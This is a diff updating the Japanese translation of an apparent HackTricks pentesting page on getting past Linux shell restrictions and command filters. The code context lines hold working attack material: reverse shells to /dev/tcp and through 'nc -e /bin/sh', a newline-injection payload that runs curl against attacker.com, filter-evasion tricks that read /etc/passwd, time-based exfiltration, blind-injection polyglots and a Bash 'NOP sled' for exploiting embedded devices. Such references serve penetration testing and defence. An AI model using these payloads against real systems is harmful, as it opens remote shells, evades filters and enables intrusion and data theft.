@@ -1,10 +1,10 @@
-# Linux Restrictions の Bypass
+# Linux Restrictions の bypass
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Common Limitations Bypasses
+## よくある制限の bypass
 
-PayloadsAllTheThings、Bo0oM's cheat sheet、およびリンク先の2つのSecjuice記事にあるcommand-injectionとWAF-evasionのコレクションでは、このセクションのshell-syntaxのバリエーションについての背景を確認できます。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+PayloadsAllTheThings、Bo0oM's cheat sheet、およびリンク先の2つの Secjuice の記事にある command-injection と WAF-evasion のコレクションでは、このセクションで扱う shell-syntax のバリエーションについての背景を確認できます。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
 ### Reverse Shell
 ```bash
@@ -20,7 +20,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Bypassパスと禁止ワード
+### Bypass Path と禁止ワード
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -80,7 +80,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### 禁止された空白文字をバイパスする
+### 禁止されたスペースをバイパス
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -131,7 +131,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### 時間ベースのデータ持ち出し
+### 時間ベースのデータ流出
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -140,14 +140,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNSデータexfiltration
+### DNS data exfiltration
 
-out-of-band callbackでは、Burp Collaboratorのようなcollaborator-style serviceによって、target applicationがexternal serverと通信するよう誘導できます。既存の[**pingb**](http://pingb.in) linkは、現在の可用性を示すものではなく、過去のnavigationとして保持されています。<sup>[[6]](#references)</sup>
+out-of-band callbackでは、Burp CollaboratorのようなCollaborator-style serviceを使用して、target applicationに外部サーバーとの通信を行わせることができます。既存の[**pingb**](http://pingb.in)リンクは、現在の利用可能性を示すものではなく、過去のナビゲーションとして残されています。<sup>[[6]](#references)</sup>
 
 ### Builtins
 
-restricted shellでは、利用可能なbuiltinsがこれらの例で使用できる残りのcommand surfaceです。Bashはbuiltin commandsとexecution grammarについて説明しています。<sup>[[7]](#references)</sup> Idea from [**devploit**](https://twitter.com/devploit)。\
-まず既存の[**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) navigationから始め、続いて以下のBash固有のtechniquesを試してください:<sup>[[7]](#references)</sup>
+restricted shellでは、利用可能なbuiltinsがこれらの例で使用できる残りのコマンド・サーフェスです。Bashではbuiltin commandsとexecution grammarが文書化されています。<sup>[[7]](#references)</sup> Idea from [**devploit**](https://twitter.com/devploit)。\
+まず既存の[**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)へのナビゲーションから始め、次のBash固有のテクニックを試してください。<sup>[[7]](#references)</sup>
 ```bash
 # Get list of builtins
 declare builtins
@@ -204,21 +204,21 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### 正規表現のバイパスの可能性
+### 潜在的な正規表現をバイパスする
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
 
-以下の呼び出しでは、オープンソースの Bash obfuscation framework である Bashfuscator を使用しています。コードコメント内の repository link は navigation のために保持されています。<sup>[[8]](#references)</sup>
+以下の呼び出しでは、オープンソースの Bash obfuscation framework である Bashfuscator を使用します。コードコメント内の repository link は navigation のために保持されています。<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
 ### 5文字でRCE
 
-以下の2つの歴史的な5文字の例は、チャレンジの再現用として残されています。主要なチャレンジリポジトリは[Orange Tsaiのリポジトリ](https://github.com/orangetw/My-CTF-Web-Challenges)で利用できます。一方、コードブロック内の2つ目のwrite-upリンクはナビゲーション用であり、現在利用可能かどうかは確認されていません。<sup>[[9]](#references)</sup>
+以下の2つの歴史的な5文字の例は、challengeの再現として掲載されています。主要なchallenge repositoryは[Orange Tsai’s repository](https://github.com/orangetw/My-CTF-Web-Challenges)で確認できます。一方、コードブロック内の2つ目のwrite-up linkはナビゲーション用であり、現在も利用可能かどうかは確認されていません。<sup>[[9]](#references)</sup>
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -302,13 +302,13 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-**read-only および noexec の保護**が適用された filesystem 内、または **distroless image** 内にいる場合、環境によって実行が制限されます。これらの制約については Linux の `mount(8)` と Distroless project に記載されており、リンク先のページではその制約下で作業するための techniques をまとめています。<sup>[[11]](#references)[[12]](#references)</sup>
+**read-only および noexec の保護**が適用された filesystem 内、または **distroless image** 内にいる場合、環境によって実行が制限されます。これらの制約は Linux の `mount(8)` と Distroless project に記載されており、リンク先のページでは、その制約下で作業するための techniques がまとめられています。<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & その他の Jail の Bypass
+## Chroot & other Jails Bypass
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -316,23 +316,23 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-脆弱性によって、最終的に `system()` や別の shell に渡される引数を部分的に制御できる場合、payload の offset が不確実になることがあります。Alan Cao と Will Tan は、shell payload を memory-mapped NVRAM に spray し、先頭に spaces を付加する、制約のある embedded device のケースについて説明しています。<sup>[[5]](#references)</sup>
+脆弱性によって、最終的に `system()` やその他の shell に渡される引数を部分的に制御できる場合、payload の offset が不確実になることがあります。Alan Cao と Will Tan は、shell payload を memory-mapped NVRAM に大量に配置し、その前に spaces を付加する、制約のある embedded device のケースについて説明しています。<sup>[[5]](#references)</sup>
 
-したがって、実際の command の前に spaces または tab characters の長いシーケンスを付加することで、*Bash 用の NOP sled* を作成できます。Bash は、simple command 内で words を区切る blanks として spaces と tabs を定義しています。<sup>[[5]](#references)[[7]](#references)</sup>
+したがって、実際の command の前に spaces または tab characters を長く連続して付加することで、*Bash 用の NOP sled* を作成できます。Bash は、simple command 内で words を区切る blank として spaces と tabs を定義しています。<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-ROP chain（または別の memory-corruption primitive）が、space block 内の任意の位置から始まる command-string pointer を渡す場合、Bash は command に到達するまで先頭に残った空白を解析できます。d router exploit では、これにより不確かな string offset を使用できました。<sup>[[5]](#references)[[7]](#references)</sup>
+ROP chain（または別の memory-corruption primitive）が space block 内の任意の位置から始まる command-string pointer を渡す場合、Bash は command に到達するまで先頭に残った空白を解析できます。引用された router exploit では、これにより不確定な文字列オフセットを使用できました。<sup>[[5]](#references)[[7]](#references)</sup>
 
-制約のある embedded target における実用例には、以下が含まれます。<sup>[[5]](#references)</sup>
+制約のある embedded target における実用的なユースケースには、以下が含まれます。<sup>[[5]](#references)</sup>
 
-1. **Memory-mapped configuration blobs**（例：NVRAM）。これはプロセス間でアクセスできます。<sup>[[5]](#references)</sup>
-2. Payload をアラインするために攻撃者が NULL bytes を書き込めない payload channel（alignment problem の一般的な応用）。<sup>[[5]](#references)</sup>
-3. 小規模な BusyBox `ash`/`sh` environment を備えた embedded device。BusyBox は resource-constrained system における applet としてこれらを文書化しています。<sup>[[10]](#references)</sup>
+1. **Memory-mapped configuration blobs**（例：NVRAM）。process 間でアクセス可能です。<sup>[[5]](#references)</sup>
+2. attacker が payload のアライメント調整のために NULL bytes を書き込めない payload channel（alignment problem の一般的な応用）。<sup>[[5]](#references)</sup>
+3. 小規模な BusyBox `ash`/`sh` environment を持つ embedded device。BusyBox は resource-constrained system における applet としてこれらを文書化しています。<sup>[[10]](#references)</sup>
 
-> 🛠️ 制御された lab で `system()` を呼び出す ROP gadget とこの technique を組み合わせます。d router research は、制約のある hardware 上でこの組み合わせを実証しています。<sup>[[5]](#references)</sup>
+> 🛠️  管理された lab で、`system()` を呼び出す ROP gadget とこの technique を組み合わせてください。引用された router research は、制約のある hardware 上でこの組み合わせを実証しています。<sup>[[5]](#references)</sup>
 
 ## References
 
@@ -340,7 +340,7 @@ ROP chain（または別の memory-corruption primitive）が、space block 内�
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 - [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Alan Cao and Will Tan — 放棄された hardware の zero day を exploit する — Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [5] [Alan Cao and Will Tan — 廃棄された hardware の zero day を Exploit する — Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
 - [7] [bash(1) — Linux manual page](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
